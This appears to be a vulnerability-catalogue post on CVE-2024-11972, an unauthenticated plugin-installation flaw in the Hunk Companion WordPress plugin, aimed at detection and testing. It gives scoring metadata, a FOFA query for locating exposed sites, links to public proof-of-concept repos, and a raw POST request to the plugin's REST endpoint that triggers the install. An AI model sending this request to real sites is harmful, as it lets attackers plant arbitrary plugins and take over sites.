---
layout: "post"
cve_id: "CVE-2024-11972"
title: "Hunk Companion < 1.9.0 - Unauthenticated Plugin Installation"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-11972.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-11972.yaml"
author: "s4e-io"
severity: "critical"
reference:
  - "https://wpscan.com/vulnerability/4963560b-e4ae-451d-8f94-482779c415e4/"
  - "https://github.com/JunTakemura/exploit-CVE-2024-11972"
  - "https://github.com/Nxploited/CVE-2024-11972-PoC"
  - "https://github.com/RonF98/CVE-2024-11972-POC"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2024-11972"
  epss-score: 0.91677
  epss-percentile: 0.99657
  cpe: "cpe:2.3:a:themehunk:hunk_companion:*:*:*:*:*:wordpress:*:*"
metadata:
  vendor: "themehunk"
  product: "hunk_companion"
  framework: "wordpress"
  fofa-query: "body=\"/wp-content/plugins/hunk-companion/\""
tags:
  - "cve"
  - "cve-2024"
  - "wordpress"
  - "wp"
  - "wp-plugin"
  - "hunk-companion"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
The plugin does not correctly authorize some REST API endpoints, allowing unauthenticated requests to install and activate arbitrary plugins from the WordPress.org repo, including vulnerable plugins that have been closed.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/9.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-json/hc/v1/themehunk-import HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063
Connection: close
Content-Length: 151
Content-Type: application/json
Accept-Encoding: gzip

{"params":{"templateType":"free","plugin":{"nvzkyl": "nvzkyl"},"allPlugins":[{"nvzkyl": "nvzkyl/nvzkyl.php"}]},"headers":{"X-WP-Nonce":"nbedhfpcnxct"}}
```


